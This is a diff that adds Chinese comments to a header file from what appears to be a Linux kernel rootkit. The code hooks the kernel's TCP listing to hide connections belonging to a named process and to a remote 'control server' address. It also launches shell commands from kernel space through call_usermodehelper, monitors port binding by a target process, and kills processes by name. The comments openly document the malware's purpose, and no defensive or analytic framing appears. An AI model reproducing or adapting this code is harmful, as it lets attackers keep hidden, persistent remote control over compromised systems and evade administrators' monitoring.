@@ -1,3 +1,9 @@
+/**
+ * 网络包处理和TCP连接隐藏头文件
+ * 实现网络连接的隐藏、过滤和用户空间程序执行
+ * 支持多种内核版本的网络栈兼容性
+ */
+
 #ifndef RPKT_H
 #define RPKT_H
 
@@ -42,9 +48,10 @@
 
 #include "config.h"
 
-
+// IP地址打印宏
 #define NIPQUAD(addr) ((unsigned char *)&addr)[0], ((unsigned char *)&addr)[1], ((unsigned char *)&addr)[2], ((unsigned char *)&addr)[3]
 
+// 内核版本兼容性宏定义
 #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 28)
 #define get_task_uid(task) task->uid
 #define get_task_parent(task) task->parent
@@ -53,30 +60,41 @@
 #define get_task_parent(task) task->real_parent
 #endif
 
+// 钩子表外部引用
 extern hook_t _tbl[];
 
+/**
+ * 登录上下文结构体
+ * 存储控制连接的网络信息
+ */
 typedef struct login_ctx_t
 {
-    unsigned int control_sip;
-    unsigned short control_sport;
-    unsigned short wport;
-    unsigned short tport;
-    int cnt;
-    int start;
-    atomic_t usage;
+    unsigned int control_sip;      // 控制服务器IP地址
+    unsigned short control_sport;  // 控制服务器端口
+    unsigned short wport;          // 工作端口
+    unsigned short tport;          // 目标端口
+    int cnt;                       // 计数器
+    int start;                     // 启动标志
+    atomic_t usage;                // 使用计数
 
 } LOGIN_CTX;
 
+// 全局登录上下文
 LOGIN_CTX login_ctx = {0, 0, 0, 0, 0, 0, ATOMIC_INIT(0)};
 
-
-
-/*from net/ipv4/tcp_ipv4.c*/
+// 从net/ipv4/tcp_ipv4.c获取的临时缓冲区大小
 #define TMPSZ 150
 
+// 端口获取函数指针
 static int (*this_get_port)(struct sock *sk, unsigned short snum);
 ///-------------------------------------------------------------------------------------
 
+/**
+ * 查找指定名称的任务
+ * 遍历任务列表查找匹配的进程
+ * @param _name 要查找的进程名
+ * @return 任务结构体指针，未找到返回NULL
+ */
 inline struct task_struct *lookuptsk(const char *_name)
 {
 	rcu_read_lock();
@@ -97,6 +115,12 @@ inline struct task_struct *lookuptsk(const char *_name)
     return NULL;
 }
 
+/**
+ * 比较任务和inode
+ * 检查指定任务是否使用指定的inode
+ * @param in_inode 要检查的inode
+ * @return 1表示匹配，0表示不匹配
+ */
 inline int cmp_task(struct inode *in_inode)
 {
     struct fdtable *fdt = NULL;
@@ -106,7 +130,7 @@ inline int cmp_task(struct inode *in_inode)
     unsigned int idx = 0;
     struct inode *inode = NULL;
 
-    // get task
+    // 获取指定名称的任务
     task = lookuptsk(_kname);
 
     if(task == NULL || in_inode == NULL)
@@ -118,6 +142,7 @@ inline int cmp_task(struct inode *in_inode)
 		return 0;
 	
 	rcu_read_lock();
+    // 遍历任务的文件描述符表
     for (fdt = files_fdtable(files); idx < fdt->max_fds; ++idx)
     {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 0)
@@ -152,6 +177,12 @@ found:
     return 1;
 }
 
+/**
+ * 检查套接字是否需要隐藏
+ * 基于任务和inode匹配判断
+ * @param sk 套接字结构体
+ * @return 1表示需要隐藏，0表示不需要隐藏，-1表示错误
+ */
 int check_(struct sock *sk)
 {
     struct inode *inode = NULL;
@@ -162,7 +193,7 @@ int check_(struct sock *sk)
         return -1;
     }
 
-    // TCP_ESTABLISHED, TCP_LISTEN has sk->sk_socket
+    // 只处理已建立连接和监听状态的套接字
     if (sk->sk_state == TCP_ESTABLISHED || sk->sk_state == TCP_LISTEN) {
         if (sk->sk_socket == NULL || sk->sk_socket->file == NULL)
         {
@@ -188,6 +219,13 @@ int check_(struct sock *sk)
     return 0;
 }
 
+/**
+ * TCP序列显示钩子函数
+ * 过滤TCP连接显示，隐藏指定连接
+ * @param seq 序列文件结构体
+ * @param v 数据指针
+ * @return 0表示隐藏，其他值表示正常显示
+ */
 int v4_seq_show(struct seq_file *seq, void *v)
 {
     int ret = 0;
@@ -198,15 +236,19 @@ int v4_seq_show(struct seq_file *seq, void *v)
     hook_t *hk = NULL;
     int _tcp4_seq_show(struct seq_file * seq, void *v);
 
+    // 获取钩子表项
     hk = &_tbl[0];
 
+    // 处理序列开始标记
     if(SEQ_START_TOKEN == v)
     {
         return ((typeof(_tcp4_seq_show) *)hk->stub_bak)(seq, v);
     }
 
+    // 获取inet套接字信息
     inet = inet_sk((struct sock *) v);
 
+    // 内核版本兼容性处理：获取地址和端口信息
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
     __be32 _daddr = inet->inet_daddr;
     __be32 _rcv_saddr = inet->inet_rcv_saddr;
@@ -221,11 +263,13 @@ int v4_seq_show(struct seq_file *seq, void *v)
     unsigned short _dport = inet->dport;
 #endif
 
+    // 检查是否需要隐藏此连接
     if(check_(_sock) == 1)
     {
         return 0;
     }
 
+    // 处理TIME_WAIT状态的连接
     if (_sock->sk_state == TCP_TIME_WAIT)
     {
         itw = inet_twsk((struct sock *) v);
@@ -238,6 +282,7 @@ int v4_seq_show(struct seq_file *seq, void *v)
         }
     }
 
+    // 处理已建立连接的隐藏
     if (login_ctx.control_sip != 0)
     {
         if ((_daddr == login_ctx.control_sip && _dport == login_ctx.control_sport) || (_rcv_saddr == login_ctx.control_sip && _sport == login_ctx.control_sport))
@@ -248,19 +293,20 @@ int v4_seq_show(struct seq_file *seq, void *v)
         }
     }
 
+    // 调用原始的TCP序列显示函数
     return ((typeof(_tcp4_seq_show) *)hk->stub_bak)(seq, v);
 
-
 ret:
-
     return ret;
 }
 
 ///-------------------------------------------------------------------------------------
+// 用户模式助手等待进程标志
 #ifndef UMH_WAIT_PROC
 #define UMH_WAIT_PROC 1
 #endif
-/* execute for userspace */
+
+/* 用户空间执行环境变量 */
 static char *envp[] =
 {
     "HOME=/",
@@ -272,12 +318,24 @@ static char *envp[] =
     NULL
 };
 
+// 用户空间执行参数
 static char *argv[4] = {"/bin/sh", "-c", _kpath, NULL};
+
+/**
+ * 工作参数结构体
+ * 用于延迟执行用户空间命令
+ */
 struct wargs
 {
-    struct work_struct work;
-    char *cmd;
+    struct work_struct work;       // 工作结构体
+    char *cmd;                     // 命令字符串
 };
+
+/**
+ * 执行用户空间命令的工作函数
+ * 通过call_usermodehelper执行shell命令
+ * @param data 工作结构体指针
+ */
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 20)
 void _exec(struct work_struct *data)
 #else
@@ -286,6 +344,7 @@ void _exec(void *data)
 {
     int result = 0;
 
+    // 调用用户模式助手执行命令
     result = call_usermodehelper(argv[0], (char **)argv, (char **)envp, UMH_WAIT_PROC); //UMH_WAIT_EXEC = 0
     if (result)
         debug(" call_usermodehelper is %d\n", result);
@@ -293,19 +352,27 @@ void _exec(void *data)
 
 }
 
+/**
+ * 启动用户空间命令执行
+ * 创建工作队列项，延迟执行命令
+ * @return 成功返回0
+ */
 int _run(void)
 {
     struct wargs *wargs;
 
+    // 分配工作参数结构体
     wargs = kmalloc(sizeof(struct wargs), GFP_ATOMIC);
     wargs->cmd = kmalloc(1024 * sizeof(char), GFP_ATOMIC);
 
+    // 初始化工作队列项
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 20)
     INIT_WORK(&wargs->work, _exec);
 #else
     INIT_WORK(&wargs->work, _exec, &wargs->work);
 #endif
 
+    // 调度工作队列项
     schedule_work(&wargs->work);
 
     debug("_run  \n");
@@ -314,6 +381,13 @@ int _run(void)
 }
 
 //--------------------------------------------------------------------------------------
+/**
+ * 端口获取钩子函数
+ * 监控指定进程的端口使用情况
+ * @param sk 套接字结构体
+ * @param snum 端口号
+ * @return 原始函数的返回值
+ */
 static int get_port(struct sock *sk, unsigned short snum)
 {
     int ret;
@@ -321,10 +395,12 @@ static int get_port(struct sock *sk, unsigned short snum)
     unsigned short port1;
     struct task_struct *htask;
 
+    // 调用原始的端口获取函数
     ret = this_get_port(sk, snum);
     if (ret != 0)
         return ret;
 
+    // 获取套接字的端口信息
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 34)
     port = inet_sk(sk)->inet_num;
     port1 = inet_sk(sk)->inet_sport;
@@ -335,6 +411,7 @@ static int get_port(struct sock *sk, unsigned short snum)
 
     htask = current;
 
+    // 检查是否是目标进程
     if ((strstr(htask->comm, _kname) != NULL) && port != 0)
     {
         debug("  %s  to port : %d \n", htask->comm, (port) );
@@ -345,6 +422,11 @@ static int get_port(struct sock *sk, unsigned short snum)
     return ret;
 }
 
+/**
+ * 发送信号杀死指定进程
+ * 遍历任务列表，向匹配名称的进程发送SIGKILL信号
+ * @param pid_name 进程名称
+ */
 static inline void sig_out(const char *pid_name)
 {
     struct task_struct *task = &init_task;
@@ -365,11 +447,17 @@ static inline void sig_out(const char *pid_name)
 
 ///-------------------------------------------------------------------------------------
 
+// 超时检查相关变量
 static unsigned long _newtm = 0;
-#define MAX_TIMEOUT (12 * HZ)       // 12 s
+#define MAX_TIMEOUT (12 * HZ)       // 12秒超时
+
+/**
+ * 检查是否超时
+ * @return 0表示超时，-1表示未超时
+ */
 static inline int tm_check(void)
 {
-    // expires
+    // 检查是否超过最大超时时间
     if ( time_after(jiffies, _newtm + MAX_TIMEOUT) )
     {
         debug("timeout! \n");
@@ -379,12 +467,17 @@ static inline int tm_check(void)
         return -1;
 }
 
+/**
+ * 重置登录上下文
+ * 清空所有登录相关信息
+ */
 static inline void reset_ctx(void)
 {
     memset(&login_ctx, 0, sizeof(LOGIN_CTX));
 }
 //----------------------------------------------------------------------------------------------------------------------------
 
+// 内核版本兼容性：IP头获取函数
 #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 22)
 inline struct iphdr *ip_hdr2(const struct sk_buff *skb)
 {
@@ -392,7 +485,12 @@ inline struct iphdr *ip_hdr2(const struct sk_buff *skb)
 }
 #endif
 
-
+/**
+ * 计算SKB校验和
+ * 获取IP头并计算校验和
+ * @param skb SKB缓冲区
+ * @return 校验和值
+ */
 inline int _skb_rcsum(struct sk_buff *skb)
 {
     struct iphdr *iph = NULL;
